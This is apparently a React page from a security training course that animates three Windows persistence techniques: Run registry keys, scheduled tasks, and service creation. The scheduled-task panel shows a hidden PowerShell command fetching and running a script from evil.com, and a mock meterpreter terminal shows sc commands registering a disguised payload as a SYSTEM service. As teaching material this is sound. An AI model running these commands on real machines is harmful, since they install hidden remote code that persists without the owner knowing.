"use client";

import { useState } from "react";
import { ModulePhaseLayout } from "@/components/layout/ModulePhaseLayout";
import { motion, AnimatePresence } from "framer-motion";
import { FolderOpen, FileCode, Clock, Settings, Zap, Terminal } from "lucide-react";

// ============================================================================
// PHASE 1: Startup & Run Key Hooks
// ============================================================================

function Phase1Registry() {
  const [persisted, setPersisted] = useState(false);

  return (
    <div className="absolute inset-0 bg-[#e0e0e0] p-4 flex flex-col font-sans text-black">
      <div className="flex-1 bg-white border border-gray-400 shadow-2xl rounded flex flex-col">
        
        {/* Title Bar */}
        <div className="bg-[#f0f0f0] border-b border-gray-300 px-3 py-2 flex items-center justify-between text-xs">
          <div className="flex items-center gap-2 font-bold">
            <FolderOpen className="w-4 h-4 text-[#0066cc]" />
            Registry Editor
          </div>
          <button 
            onClick={() => setPersisted(true)}
            className="px-3 py-1 bg-[#0066cc] text-white border border-[#005bb5] rounded hover:bg-[#005bb5] transition-colors shadow-sm"
          >
            Execute Malware (Establish Persistence)
          </button>
        </div>

        {/* Address Bar */}
        <div className="bg-[#fafafa] border-b border-gray-300 px-3 py-2 text-xs text-gray-700 font-mono">
          Computer\HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
        </div>

        <div className="flex-1 flex text-sm">
          {/* Left Tree */}
          <div className="w-1/3 border-r border-gray-300 p-2 overflow-y-auto bg-[#fafafa]">
            <ul className="list-none pl-4 space-y-1">
              <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> HKEY_CLASSES_ROOT</li>
              <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> HKEY_CURRENT_USER</li>
              <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> HKEY_LOCAL_MACHINE
                <ul className="pl-4 mt-1 border-l border-dotted border-gray-400 space-y-1">
                  <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> Software
                    <ul className="pl-4 mt-1 border-l border-dotted border-gray-400 space-y-1">
                      <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> Microsoft
                        <ul className="pl-4 mt-1 border-l border-dotted border-gray-400 space-y-1">
                          <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> Windows
                            <ul className="pl-4 mt-1 border-l border-dotted border-gray-400 space-y-1">
                              <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> CurrentVersion
                                <ul className="pl-4 mt-1 border-l border-dotted border-gray-400 space-y-1">
                                  <li className="flex items-center gap-1 font-bold bg-[#cce8ff] px-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> Run</li>
                                  <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> RunOnce</li>
                                </ul>
                              </li>
                            </ul>
                          </li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                </ul>
              </li>
              <li className="flex items-center gap-1"><FolderOpen className="w-4 h-4 text-[#d9a300]" /> HKEY_USERS</li>
            </ul>
          </div>

          {/* Right Values */}
          <div className="flex-1 p-2 bg-white">
            <table className="w-full text-left">
              <thead>
                <tr className="border-b border-gray-300">
                  <th className="font-normal text-gray-600 pb-1 w-1/3">Name</th>
                  <th className="font-normal text-gray-600 pb-1 w-1/4">Type</th>
                  <th className="font-normal text-gray-600 pb-1">Data</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td className="py-2 flex items-center gap-1"><FileCode className="w-4 h-4 text-[#0066cc]" /> (Default)</td>
                  <td className="py-2">REG_SZ</td>
                  <td className="py-2 text-gray-500">(value not set)</td>
                </tr>
                <tr>
                  <td className="py-2 flex items-center gap-1"><FileCode className="w-4 h-4 text-[#0066cc]" /> SecurityHealth</td>
                  <td className="py-2">REG_EXPAND_SZ</td>
                  <td className="py-2">%windir%\system32\SecurityHealthSystray.exe</td>
                </tr>
                <AnimatePresence>
                  {persisted && (
                    <motion.tr 
                      initial={{ backgroundColor: "#ffcccc", opacity: 0 }}
                      animate={{ backgroundColor: "#ffffff", opacity: 1 }}
                      transition={{ duration: 1 }}
                    >
                      <td className="py-2 flex items-center gap-1"><FileCode className="w-4 h-4 text-[#0066cc]" /> WindowsAudioService</td>
                      <td className="py-2">REG_SZ</td>
                      <td className="py-2 text-red-600 font-bold bg-red-50 p-1 border border-red-200">&quot;C:\Windows\Temp\malware_payload.exe&quot; -silent</td>
                    </motion.tr>
                  )}
                </AnimatePresence>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}

// ============================================================================
// PHASE 2: Scheduled Tasks & WMI Triggers
// ============================================================================

function Phase2Tasks() {
  const [created, setCreated] = useState(false);

  return (
    <div className="absolute inset-0 bg-[#0a0a0a] p-8 flex flex-col font-sans">
      
      <div className="flex justify-between items-center mb-6">
        <div className="text-gray-300 font-bold flex items-center gap-2">
          <Clock className="w-5 h-5 text-purple-500" /> Windows Task Scheduler (Weaponized)
        </div>
        <button 
          onClick={() => setCreated(true)}
          disabled={created}
          className="px-6 py-2 bg-purple-900 hover:bg-purple-800 disabled:opacity-50 text-white text-sm font-bold rounded transition-colors"
        >
          Create Scheduled Task (schtasks.exe)
        </button>
      </div>

      <div className="flex-1 bg-[#1e1e1e] border border-gray-700 rounded-lg overflow-hidden flex flex-col shadow-2xl">
        <div className="bg-[#2d2d2d] px-4 py-2 text-gray-400 flex items-center gap-2 border-b border-gray-900 text-sm">
          Task Scheduler Library
        </div>

        <div className="flex-1 p-6">
          <table className="w-full text-left text-sm text-gray-300">
            <thead>
              <tr className="border-b border-gray-700 text-gray-500">
                <th className="pb-2">Name</th>
                <th className="pb-2">Status</th>
                <th className="pb-2">Triggers</th>
                <th className="pb-2">Next Run Time</th>
                <th className="pb-2">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800">
              <tr>
                <td className="py-4 flex items-center gap-2"><Clock className="w-4 h-4 text-gray-500" /> Adobe Acrobat Update</td>
                <td className="py-4">Ready</td>
                <td className="py-4">Every day at 12:00 PM</td>
                <td className="py-4">12:00:00 PM</td>
                <td className="py-4 font-mono text-xs">C:\Program Files\...</td>
              </tr>
              <tr>
                <td className="py-4 flex items-center gap-2"><Clock className="w-4 h-4 text-gray-500" /> GoogleUpdateTask</td>
                <td className="py-4">Ready</td>
                <td className="py-4">At log on of any user</td>
                <td className="py-4">N/A</td>
                <td className="py-4 font-mono text-xs">C:\Program Files (x86)\...</td>
              </tr>
              <AnimatePresence>
                {created && (
                  <motion.tr 
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    className="bg-purple-950/30"
                  >
                    <td className="py-4 flex items-center gap-2 text-purple-400 font-bold"><Zap className="w-4 h-4" /> System_Integrity_Check</td>
                    <td className="py-4 text-purple-400">Ready</td>
                    <td className="py-4 font-bold text-red-400">On Idle (10 mins) OR System Startup</td>
                    <td className="py-4 text-purple-400">Next Boot</td>
                    <td className="py-4 font-mono text-xs text-red-400 bg-red-950/50 p-1 rounded border border-red-900">
                      powershell.exe -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString(&apos;http://evil.com/payload.ps1&apos;)&quot;
                    </td>
                  </motion.tr>
                )}
              </AnimatePresence>
            </tbody>
          </table>
        </div>
      </div>

      <AnimatePresence>
        {created && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="mt-6 bg-purple-950 border border-purple-500 p-4 rounded-lg flex items-center gap-4 text-purple-200 text-sm">
            <Terminal className="w-6 h-6 text-purple-400 flex-shrink-0" />
            <div>
              <span className="font-bold text-purple-400">Lateral WMI Persistence:</span> Malware often abuses Windows Management Instrumentation (WMI) event subscriptions to trigger fileless PowerShell payloads (like the one above) without leaving a footprint in the standard Registry run keys.
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// ============================================================================
// PHASE 3: Windows Service Creation
// ============================================================================

function Phase3Service() {
  const [step, setStep] = useState(0);

  const createService = async () => {
    setStep(1); // SC CREATE
    await new Promise(r => setTimeout(r, 1500));
    setStep(2); // Start Service
    await new Promise(r => setTimeout(r, 1000));
    setStep(3); // Running
  };

  return (
    <div className="absolute inset-0 bg-[#050505] p-6 flex flex-col items-center justify-center font-mono">
      <div className="w-full max-w-5xl flex gap-8">
        
        {/* Attacker Terminal */}
        <div className="w-96 bg-black border border-gray-800 rounded-lg flex flex-col shadow-[0_0_30px_rgba(255,0,0,0.15)] overflow-hidden">
          <div className="bg-gray-900 border-b border-gray-800 p-2 text-red-500 text-xs font-bold flex justify-between items-center">
            <span>root@kali:~# msfconsole</span>
            <button 
              onClick={createService}
              disabled={step > 0}
              className="px-3 py-1 bg-red-900 hover:bg-red-800 disabled:opacity-50 text-white rounded transition-colors"
            >
              Run SC command
            </button>
          </div>
          <div className="p-4 flex-1 text-green-500 text-xs leading-relaxed">
            <div>meterpreter &gt; shell</div>
            <div>Process 8102 created.</div>
            <div>Channel 1 created.</div>
            <br/>
            {step >= 1 && (
              <motion.div initial={{opacity:0}} animate={{opacity:1}}>
                <span className="text-gray-400">C:\Windows\system32&gt;</span> sc create &quot;WinDefendUpdater&quot; binpath= &quot;C:\Windows\Temp\payload.exe&quot; start= auto
                <br/><span className="text-yellow-400">[SC] CreateService SUCCESS</span>
              </motion.div>
            )}
            {step >= 2 && (
              <motion.div initial={{opacity:0}} animate={{opacity:1}} className="mt-2">
                <span className="text-gray-400">C:\Windows\system32&gt;</span> sc start &quot;WinDefendUpdater&quot;
                <br/><span className="text-yellow-400">[SC] StartService SUCCESS</span>
              </motion.div>
            )}
            {step >= 3 && (
              <motion.div initial={{opacity:0}} animate={{opacity:1}} className="mt-4 text-red-500 font-bold bg-red-950/50 p-2 border border-red-900">
                [*] SYSTEM-LEVEL PERSISTENCE ACHIEVED. Payload will automatically execute as NT AUTHORITY\SYSTEM on every boot.
              </motion.div>
            )}
          </div>
        </div>

        {/* Victim services.msc */}
        <div className="flex-1 bg-white border border-gray-300 rounded flex flex-col font-sans text-sm shadow-xl">
          <div className="bg-[#f0f0f0] border-b border-gray-300 px-3 py-2 flex items-center gap-2">
            <Settings className="w-4 h-4 text-gray-500" /> Services (Local)
          </div>
          
          <table className="w-full text-left bg-white">
            <thead className="bg-gray-50">
              <tr className="border-b border-gray-300">
                <th className="font-normal text-gray-600 p-2 w-1/3">Name</th>
                <th className="font-normal text-gray-600 p-2 w-1/4">Description</th>
                <th className="font-normal text-gray-600 p-2">Status</th>
                <th className="font-normal text-gray-600 p-2">Startup Type</th>
                <th className="font-normal text-gray-600 p-2">Log On As</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-100">
              <tr>
                <td className="p-2 flex items-center gap-2"><Settings className="w-4 h-4 text-blue-500" /> Windows Audio</td>
                <td className="p-2 text-xs text-gray-500">Manages audio for Windows...</td>
                <td className="p-2">Running</td>
                <td className="p-2">Automatic</td>
                <td className="p-2">Local Service</td>
              </tr>
              <tr>
                <td className="p-2 flex items-center gap-2"><Settings className="w-4 h-4 text-blue-500" /> Windows Defender</td>
                <td className="p-2 text-xs text-gray-500">Helps protect your computer...</td>
                <td className="p-2">Running</td>
                <td className="p-2">Automatic</td>
                <td className="p-2">Local System</td>
              </tr>
              <AnimatePresence>
                {step >= 1 && (
                  <motion.tr 
                    initial={{ backgroundColor: "#ffcccc", opacity: 0 }}
                    animate={{ backgroundColor: "#ffffff", opacity: 1 }}
                    className="bg-red-50"
                  >
                    <td className="p-2 flex items-center gap-2 font-bold text-red-600"><Settings className="w-4 h-4 text-red-500" /> WinDefendUpdater</td>
                    <td className="p-2 text-xs text-red-400">Updates Windows Definitions</td>
                    <td className="p-2 font-bold">
                      {step >= 3 ? <span className="text-green-600">Running</span> : <span className="text-gray-400">Stopped</span>}
                    </td>
                    <td className="p-2">Automatic</td>
                    <td className="p-2 font-mono text-xs bg-black text-green-400 px-1">LocalSystem</td>
                  </motion.tr>
                )}
              </AnimatePresence>
            </tbody>
          </table>
        </div>

      </div>
    </div>
  );
}


// ============================================================================
// MAIN PAGE EXPORT
// ============================================================================

export default function Module4Page() {
  const [phase, setPhase] = useState(0);

  const phases = [
    {
      title: "Registry Run Keys",
      description: "The simplest and most common form of Windows persistence. Malware writes its file path to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run so it executes every time the user logs in.",
      component: <Phase1Registry />,
    },
    {
      title: "WMI & Scheduled Tasks",
      description: "For deeper lateral persistence, malware weaponizes Windows Management Instrumentation (WMI) event subscriptions or the Task Scheduler to trigger fileless payloads upon system boot or inactivity.",
      component: <Phase2Tasks />,
    },
    {
      title: "Service Hijacking",
      description: "Advanced malware with Administrator privileges installs itself as a background Windows Service. This guarantees it runs immediately on boot and executes as 'NT AUTHORITY\\SYSTEM', the highest privilege level.",
      component: <Phase3Service />,
    }
  ];

  return (
    <ModulePhaseLayout
      moduleNumber={4}
      moduleTitle="Multi-Vector Persistence"
      moduleThreat="CRITICAL"
      phases={phases}
      currentPhase={phase}
      setPhase={setPhase}
    />
  );
}
